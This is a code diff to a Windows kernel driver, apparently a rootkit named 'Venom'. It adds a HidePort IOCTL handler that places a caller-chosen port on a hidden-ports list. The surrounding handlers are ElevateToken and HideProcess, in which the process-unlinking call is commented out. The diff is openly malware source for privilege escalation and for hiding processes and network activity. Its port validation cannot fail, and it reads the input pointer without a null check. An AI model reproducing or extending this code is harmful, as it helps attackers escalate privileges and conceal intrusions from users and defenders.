@@ -1,6 +1,8 @@
 #include "IoctlHandlers.h"
 #include "ProcHandler.h"
 #include "TokenHandler.h"
+#include "NetworkHandler.h"
+#include "Venom.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	PEPROCESS Process;
@@ -38,15 +40,43 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	auto pid = (PULONG)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
 	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
 
 	//status = ProcHandler::UnlinkActiveProcessLinks(*pid);
-	//status = SayHi::SayHi(6);
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
+	return status;
+}
+
+NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
+	auto status = STATUS_SUCCESS;
+	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	auto port = (USHORT*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+
+	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
+	{
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	//Add the desired port to the list of hidden ports.
+	auto size = sizeof(NetworkHandler::HiddenPort);
+	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG);
+
+	if (portToHide == nullptr)
+	{
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		goto ERROR;
+	}
+	
+	portToHide->HiddenPort = NetworkHandler::htons(*port);
+	NetworkHandler::addHiddenPort(&portToHide->Entry);
+
+ERROR:
+	Irp->IoStatus.Status = status;
+	Irp->IoStatus.Information = 0;
 	return status;
 }
